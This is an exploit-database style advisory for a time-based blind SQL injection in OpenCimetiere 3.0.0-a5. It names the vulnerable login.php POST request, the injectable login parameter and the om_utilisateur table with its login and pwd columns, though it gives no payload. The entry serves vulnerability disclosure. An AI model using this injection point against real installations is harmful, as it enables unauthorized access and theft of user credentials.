@@ -1,0 +1,18 @@
+# Exploit Title: OpenCimetiere v3.0.0-a5 | Blind SQL Injection
+# Date: 06/08/16
+# Exploit Author: Wad Deek
+# Vendor Homepage: http://www.openmairie.org/
+# Software Link: http://www.openmairie.org/catalogue/opencimetiere/
+# Version: 3.0.0-a5
++>3.0.0-a5<+ --> /opencimetiere/HISTORY.txt
+# Tested on: Xampp with PostgreSQL on Windows 7
+# Fuzzing tool: https://github.com/Trouiller-David/PHP-Source-Code-Analysis-Tools
+
+################################################################
+[SQL Injection (Type: AND/OR time-based blind)]
+################################################################
+[Database] opencimetiere
+[Table] om_utilisateur
+[Columns] login,pwd
+{POST} "/opencimetiere/scr/login.php", "login.action.connect=Se%20connecter&came_from=&login=[SQLi]&password=paSSw0rd"
+################################################################
